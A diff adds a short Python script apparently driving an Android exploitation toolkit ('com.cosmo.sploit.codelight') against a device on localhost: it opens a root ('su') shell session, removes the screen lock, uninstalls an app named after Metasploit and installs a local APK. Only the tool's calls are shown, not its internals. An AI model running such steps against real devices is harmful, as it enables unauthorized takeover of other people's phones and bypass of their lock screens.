@@ -1,0 +1,16 @@
+from com.cosmo.sploit.codelight.codelighttool import CodeLightTool
+from com.cosmo.sploit.codelight.consoleimage import ConsoleImage
+ci=ConsoleImage(_image_path="payloaddir\\ghost.png")
+cl=CodeLightTool()
+cl.start_server()
+ci.draw_image()
+cl.create_session(_host_ip="localhost",_host_port="62001",_id="1")
+cl.bind_active_session(_id="1")
+cl.set_shell_mode(_mode="su")
+cl.remove_screen_lock()
+cl.bind_apk(_apk_location_on_computer="C:\\Users\\User Name\\YourDirectory\\File.apk")
+cl.bind_app(_pkg="com.cosmo.android.tool.metasploit")
+cl.uninstall_app()
+cl.install_apk()
+cl.disconnect_device()
+cl.stop_server()
